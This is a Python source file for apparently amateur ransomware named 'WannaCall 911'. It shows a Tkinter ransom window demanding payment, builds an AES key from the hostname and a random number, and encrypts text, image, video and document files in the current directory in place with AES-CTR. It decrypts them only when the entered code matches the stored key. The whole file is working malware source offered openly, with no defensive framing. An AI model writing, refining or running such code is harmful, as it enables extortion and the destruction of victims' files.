import os
import random
import hashlib
import socket

from Crypto.Util import Counter
from Crypto.Cipher import AES

from tkinter import ttk, Tk

#  Data
wanna_call = "WannaCall 911"
payment_text = "You have been hacked by the WannaCall 911, please provide the corresponding payment"
information_text = "Your files have been encrypted, please provide the payment to unlock them"
label_text = "Provide payment code"

decrypt_field = ""
hashnumber = ""

# Root
root = Tk(screenName=wanna_call, baseName=wanna_call,
          className=wanna_call, useTk=1)
root.geometry("500x200")
# Elements
warning = ttk.Label(text=payment_text)
text = ttk.Label(text=information_text)
hash = ttk.Label(text="...")
label = ttk.Label(text=label_text)
entry = ttk.Entry()

def unlock_files():
    warning.config(text="WannaCall 911 has been removed, you are now safe")
    text.destroy()
##################################################################################################

username = os.getlogin()

destination = 'C:/Users\911/Desktop/DontEncriptMe/'

destination = os.path.abspath('')
files = os.listdir(destination)
files = [x for x in files if not x.startswith('.')]

extensions = [".txt", ".jpg", '.jpeg', 'mp4', 'mp3', 'png', 'pdf', 'docx', 'jfif']

def hash_key():
	hashnumber = destination + socket.gethostname() + str(random.randint(0, 10000000000000000000000000000000000000000000000))
	hashnumber = hashnumber.encode('utf-8')
	print(hashnumber)
	hashnumber = hashlib.sha512(hashnumber)
	hashnumber = hashnumber.hexdigest()

	new_key = []

	for k in hashnumber:
		if len(new_key) == 32:
			hashnumber = ''.join(new_key)
			break
		else:
			new_key.append(k)

	return hashnumber

def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key, decrypt_field = ""):
	files_list = open('files_list', 'w+')

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_list.write(os.path.join(file)+ '\n')
	files_list.close()

	del_space = open('files_list', 'r')
	del_space = del_space.read().split('\n')
	print(del_space)
	del_space = [i for i in del_space if not i == '']
	print(del_space)

	if os.path.exists('hash_file'):

		hash_file = open('hash_file', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt


			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
			
			unlock_files()
            
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('hash_file', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)


def clean_data():
	if os.path.exists("files_list"):
		os.remove("files_list")

	if os.path.exists("hash_file"):
		os.remove("hash_file")

	text.config(text="")
	hash.config(text="")

def main(hashnumber = ""):
	if hashnumber == "":
		hashnumber = hash_key()

	hashnumber = hashnumber.encode('utf-8')

	discover(hashnumber)

	hash.config(text=hashnumber)



# Handlers for buttons
def validate_payment():
    decrypt_field = entry.get()
    discover(hashnumber, decrypt_field=decrypt_field)



button = ttk.Button(text="Submit", command=validate_payment)

# Pack for UI
warning.pack(expand=True)
text.pack(expand=True)
label.pack()
hash.pack()
entry.pack()
button.pack(expand=True)

clean_data()
hashnumber=''
decrypt_field=''
main(hashnumber)

root.mainloop()